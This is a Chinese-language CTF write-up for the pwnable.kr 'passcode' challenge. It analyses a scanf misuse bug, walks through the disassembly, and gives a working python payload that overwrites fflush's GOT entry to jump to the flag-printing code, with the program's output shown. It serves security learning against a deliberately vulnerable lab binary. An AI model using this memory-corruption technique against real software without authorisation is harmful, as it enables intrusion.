---
title: pwnable.kr-passcode
date: 2017-12-10 21:00:00
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
## 分析
首先读源码`passcode.c`
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}

```
welcome函数功能是获取一个最大100字节的字符串，然后打印出来。login函数是主要讨论的函数，它在`scanf`函数的调用上出现问题（当时忽略了浪费了很长时间），程序本意是获取整数存储在`passcode1`和`passcode2`上但是在调用`scanf`函数时没有传入变量的地址，而是变量的值，当然也就有了利用的思路。login函数中一处调用了`fflush(stdin)`，它本意是刷新输入句柄，但刷新stdin是c编译器对c语言库的扩展，正好gcc不支持这个所以这个函数调用在这里没作用。
题目的解题思路是，利用welcome函数在栈上进行数值的排布，然后login函数在调用第一个scanf函数时就会使用栈上welcome函数遗留的栈数据，于是可以向任意四字节地址写入一个四字节数据（前提是有写权限），然后控制welcome函数的栈遗留数据和scanf函数的写入改变GOT表中fflush函数的地址，使其指向要到达的程序流程。
首先需要计算passcode1在welcome函数栈中的位置
```nasm
08048564 <login>:
 8048564:	55                   	push   %ebp
 8048565:	89 e5                	mov    %esp,%ebp
 8048567:	83 ec 28             	sub    $0x28,%esp
 804856a:	b8 70 87 04 08       	mov    $0x8048770,%eax
 804856f:	89 04 24             	mov    %eax,(%esp)
 8048572:	e8 a9 fe ff ff       	call   8048420 <printf@plt>
 8048577:	b8 83 87 04 08       	mov    $0x8048783,%eax
 804857c:	8b 55 f0             	mov    -0x10(%ebp),%edx
 804857f:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048583:	89 04 24             	mov    %eax,(%esp)
 8048586:	e8 15 ff ff ff       	call   80484a0 <__isoc99_scanf@plt>
 804858b:	a1 2c a0 04 08       	mov    0x804a02c,%eax
 8048590:	89 04 24             	mov    %eax,(%esp)
 8048593:	e8 98 fe ff ff       	call   8048430 <fflush@plt>
 8048598:	b8 86 87 04 08       	mov    $0x8048786,%eax
 804859d:	89 04 24             	mov    %eax,(%esp)
 80485a0:	e8 7b fe ff ff       	call   8048420 <printf@plt>
 80485a5:	b8 83 87 04 08       	mov    $0x8048783,%eax
 80485aa:	8b 55 f4             	mov    -0xc(%ebp),%edx
 80485ad:	89 54 24 04          	mov    %edx,0x4(%esp)
 80485b1:	89 04 24             	mov    %eax,(%esp)
 80485b4:	e8 e7 fe ff ff       	call   80484a0 <__isoc99_scanf@plt>
 80485b9:	c7 04 24 99 87 04 08 	movl   $0x8048799,(%esp)
 80485c0:	e8 8b fe ff ff       	call   8048450 <puts@plt>
 80485c5:	81 7d f0 e6 28 05 00 	cmpl   $0x528e6,-0x10(%ebp)
 80485cc:	75 23                	jne    80485f1 <login+0x8d>
 80485ce:	81 7d f4 c9 07 cc 00 	cmpl   $0xcc07c9,-0xc(%ebp)
 80485d5:	75 1a                	jne    80485f1 <login+0x8d>
 80485d7:	c7 04 24 a5 87 04 08 	movl   $0x80487a5,(%esp)
 80485de:	e8 6d fe ff ff       	call   8048450 <puts@plt>
 80485e3:	c7 04 24 af 87 04 08 	movl   $0x80487af,(%esp)
 80485ea:	e8 71 fe ff ff       	call   8048460 <system@plt>
 80485ef:	c9                   	leave  
 80485f0:	c3                   	ret    
 80485f1:	c7 04 24 bd 87 04 08 	movl   $0x80487bd,(%esp)
 80485f8:	e8 53 fe ff ff       	call   8048450 <puts@plt>
 80485fd:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048604:	e8 77 fe ff ff       	call   8048480 <exit@plt>

08048609 <welcome>:
 8048609:	55                   	push   %ebp
 804860a:	89 e5                	mov    %esp,%ebp
 804860c:	81 ec 88 00 00 00    	sub    $0x88,%esp
 8048612:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 8048618:	89 45 f4             	mov    %eax,-0xc(%ebp)
 804861b:	31 c0                	xor    %eax,%eax
 804861d:	b8 cb 87 04 08       	mov    $0x80487cb,%eax
 8048622:	89 04 24             	mov    %eax,(%esp)
 8048625:	e8 f6 fd ff ff       	call   8048420 <printf@plt>
 804862a:	b8 dd 87 04 08       	mov    $0x80487dd,%eax
 804862f:	8d 55 90             	lea    -0x70(%ebp),%edx
 8048632:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048636:	89 04 24             	mov    %eax,(%esp)
 8048639:	e8 62 fe ff ff       	call   80484a0 <__isoc99_scanf@plt>
 804863e:	b8 e3 87 04 08       	mov    $0x80487e3,%eax
 8048643:	8d 55 90             	lea    -0x70(%ebp),%edx
 8048646:	89 54 24 04          	mov    %edx,0x4(%esp)
 804864a:	89 04 24             	mov    %eax,(%esp)
 804864d:	e8 ce fd ff ff       	call   8048420 <printf@plt>
 8048652:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048655:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax
 804865c:	74 05                	je     8048663 <welcome+0x5a>
 804865e:	e8 dd fd ff ff       	call   8048440 <__stack_chk_fail@plt>
 8048663:	c9                   	leave  
 8048664:	c3                   	ret    

```
通过两个函数的汇编代码，可以发现name字符串在`ebp-70h`处，`passcode1`和`passcode2`分别在`ebp-10h`和`ebp-0ch`。又name最大为100字节所以只能控制passcode1的值，其在name中的偏移为96即为最后四个字节.
```nasm
08048430 <fflush@plt>:
 8048430:	ff 25 04 a0 04 08    	jmp    *0x804a004
 8048436:	68 08 00 00 00       	push   $0x8
 804843b:	e9 d0 ff ff ff       	jmp    8048410 <_init+0x30>
```
将其覆盖为fflush函数的got表地址`0x804a004`。然后将调用`system("/bin/cat flag")`的程序地址作为login调用scanf时的输入（这是接受输入的是整数可以转换为十进制）。
最后的payload为
```
python -c "print 'a'*96+'\x04\xa0\x04\x08\n',134514147" | ./passcode
```
```
passcode@ubuntu:~$ python -c "print 'a'*96+'\x04\xa0\x04\x08\n',134514147" | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa! 
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```
## 总结
这道题有了一点溢出的味道，主要是利用栈上遗留数据加上GOT表可写来改变程序流程。同时要有got表和plt表的基础知识。